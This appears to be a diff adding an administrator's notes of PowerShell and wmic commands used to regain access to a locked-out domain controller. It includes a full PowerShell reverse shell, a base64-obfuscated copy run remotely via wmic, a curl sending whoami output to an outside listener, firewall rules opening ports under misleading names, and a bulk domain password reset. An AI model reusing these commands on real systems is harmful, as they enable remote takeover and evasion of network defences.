@@ -1,0 +1,38 @@
+# changing all passwords in a domain quickly
+$pass = read-host -AsSecureString; dsquery user "" | dsmod -pwd $pass
+
+# we got locked out of dc, no rdp, so we used wmic to get back in. used this to just test around
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+# tried to open notepad from cmd to see if we were successful. note: wmic does not inherently send a confirmation back this way
+$pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administrator /password:$pass process call create "cmd.exe /c notepad.exe"
+
+# we thought our problems were from us potentially being removed from the RDP users group, so we added ourself back
+$pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administrator /password:$pass process call create "cmd.exe /c netsh advfirewall firewall set rule group='remote desktop' new enable=yes"
+
+# we tried using a publicly available powershell reverse shell to get a full shell to the machine, ran into issues with escape characters, etc
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('<LISTENERIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# tried downloading a file from a linux server, then check nginx access logs to verify that commands were working
+$pass = read-host -AsSecureString; wmic /node:"dc.regisdoctors.com" /user:administrator /password:$pass process call create '$test = powershell -c whoami; curl -d $test http://10.3.2.254:8000'
+
+# we knew commands were working, but we wanted to verify this by modifying the firewall
+netsh advfirewall firewall add rule name = 'Close Port 80' dir = in action = block protocol = TCP localport = 80
+
+# more firewall manipulation via wmic
+$pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administrator /password:$pass process call create "powershell -nop -exec bypass -c netsh advfirewall firewall add rule name = 'Close Port 80' dir = in action = block protocol = TCP localport = 80"
+
+# same, more firewall manipulation via wmic
+$pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administrator /password:$pass process call create "powershell -nop -exec bypass -c netsh advfirewall firewall add rule name = 'Teredo In' dir = in action = allow protocol = TCP localport = 3389"
+
+# testing base64 decoding in powershell and the executing scriptblocks via wmic
+$pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administrator /password:$pass process call create "$test = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTAuNC4xMTIuMTQnLDU0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK')); powershell $test"
+
+# trying another format
+$test = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTAuNC4xMTIuMTQnLDU0NDMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK')); $test
+
+# more firewall manipulation
+$pass = read-host -AsSecureString; wmic /node:dc.regisdoctors.com /user:administrator /password:$pass process call create "powershell -nop -exec bypass -c netsh advfirewall firewall add rule name = 'Voyage In' dir = in action = allow protocol = TCP localport = 8000"
+
+# recursively change ownership on files. needed this when restoring from backups so that www-data had full ownership. need to run in directory of /var/www/html/
+chown -R wwwrun:nogroup *
